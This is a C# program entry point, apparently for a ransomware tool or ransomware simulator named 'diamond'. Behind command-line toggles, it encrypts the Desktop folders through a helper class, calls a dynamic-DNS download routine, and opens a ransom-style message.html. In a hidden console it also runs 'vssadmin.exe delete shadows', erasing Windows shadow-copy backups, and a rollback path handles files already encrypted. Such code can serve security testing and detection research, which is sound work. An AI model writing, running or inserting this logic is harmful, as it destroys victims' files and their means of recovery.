using System;
using System.Diagnostics;
using System.IO;

namespace diamond;

internal class Program
{
	private static Logger logger = new Logger();

	private static bool ransomware = true;

	private static bool dyndnsdownload = true;

	private static bool netuse = true;

	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			Arguments arguments = new Arguments(args);
			TriggerRules triggerRules = new TriggerRules();
			if (arguments["ransomware"] != null)
			{
				ransomware = Convert.ToBoolean(arguments["ransomware"]);
			}
			if (arguments["dyndnsdownload"] != null)
			{
				dyndnsdownload = Convert.ToBoolean(arguments["dyndnsdownload"]);
			}
			if (arguments["netuse"] != null)
			{
				netuse = Convert.ToBoolean(arguments["netuse"]);
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string[] files = Directory.GetFiles(folderPath + "\\Documents", "*.encrypt");
			string[] files2 = Directory.GetFiles(folderPath + "\\Music", "*.encrypt");
			string[] files3 = Directory.GetFiles(folderPath + "\\Pictures", "*.encrypt");
			string[] files4 = Directory.GetFiles(folderPath + "\\Videos", "*.encrypt");
			if (files.Length != 0 || files2.Length != 0 || files3.Length != 0 || files4.Length != 0)
			{
				logger.AddtoLogFile("Existing encrypted files found, rolling back...");
				triggerRules.ProcessRollback(folderPath);
				Environment.Exit(0);
			}
			if (ransomware)
			{
				triggerRules.ProcessDirectory(folderPath);
			}
			if (!netuse)
			{
			}
			if (dyndnsdownload)
			{
				triggerRules.DynDnsDownload();
			}
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c message.html";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd.exe";
			process2.StartInfo.Arguments = "/c vssadmin.exe delete shadows";
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.RedirectStandardError = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
			process2.WaitForExit();
			string text = "";
			while (!process2.StandardOutput.EndOfStream)
			{
				text = text + "\t" + process2.StandardOutput.ReadLine() + "\r\n";
			}
			string text2 = "";
			while (!process2.StandardError.EndOfStream)
			{
				text2 = text2 + "\t" + process2.StandardError.ReadLine() + "\r\n";
			}
			logger.AddtoLogFile("Executed command: \r\n\t" + process2.StartInfo.FileName + " " + process2.StartInfo.Arguments + "\r\n");
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in main: " + ex.Message);
		}
	}
}
